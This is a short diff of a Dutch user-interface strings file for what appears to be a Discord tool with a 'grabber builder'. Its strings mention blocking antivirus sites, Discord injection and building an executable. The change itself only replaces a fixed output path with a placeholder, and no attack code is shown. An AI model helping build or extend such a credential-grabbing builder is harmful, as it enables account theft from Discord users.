@@ -253,7 +253,7 @@ Blokkering van AV-sites (J/N)
 DiscordInjectie (J/N)
 Bestandspictogram
 Aan het maken van {name}.exe, Dit zal enkele seconden duren. Bedankt voor uw geduld!
-Het bestand bevindt zich in 'output/grabberbuilder/{name}.exe'
+Het bestand bevindt zich in {path}
 Groepschat aangemaakt
 Tarieflimiet ({response.json()['retry_after']}ms)
 Niet genoeg vrienden beschikbaar voor willekeurige selectie
